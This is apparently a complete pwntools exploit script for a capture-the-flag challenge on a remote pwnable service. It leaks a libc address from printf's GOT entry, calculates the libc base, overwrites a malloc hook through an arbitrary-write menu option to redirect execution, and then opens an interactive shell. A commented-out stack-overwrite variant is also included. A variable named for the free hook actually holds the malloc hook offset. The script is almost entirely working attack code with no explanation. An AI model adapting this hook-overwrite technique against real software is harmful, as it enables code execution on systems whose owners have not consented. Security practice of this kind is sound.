from pwn import *

LIBC = "./alpine-libc-2.28.so"
#LIBC = "/usr/lib/x86_64-linux-gnu/libc.so.6"
libc = ELF(LIBC)

free_hook_off = libc.symbols['__malloc_hook']
debug = 0
if debug:
    sh = process('./challenge')
else:
    sh = remote('svc.pwnable.xyz',30019)

printf_got = 0x600fb8
sh.sendlineafter('> ', '1')
sh.sendlineafter('Addr: ', str(printf_got))
libc_addr = u64(sh.recvline()[0:6].ljust(8, '\x00'))


libc_base = libc_addr - libc.symbols['printf']
env_addr = libc_base + libc.symbols['environ']
'''
sh.sendlineafter('> ', '1')
sh.sendlineafter('Addr: ', str(env_addr))
stack_addr  = u64(sh.recvline()[0:6].ljust(8, '\x00'))
print "stack_addr = ", hex(stack_addr)
pause()
sh.sendlineafter('> ', '2')
sh.sendlineafter('Addr: ', str(stack_addr - 0xf0))
sh.sendlineafter('Value: ', str(0x400905))
pause()

'''
print "libc base = ", hex(libc_base)
free_hook = free_hook_off + libc_base
print "free hook = ", hex(free_hook)

sh.sendafter('> ', '2')
sh.sendafter('Addr: ', str(free_hook))
sh.sendafter('Value: ', str(0x400905))
sh.sendafter('> ', '1')
sh.sendafter('Addr: ', '1')
sh.interactive()
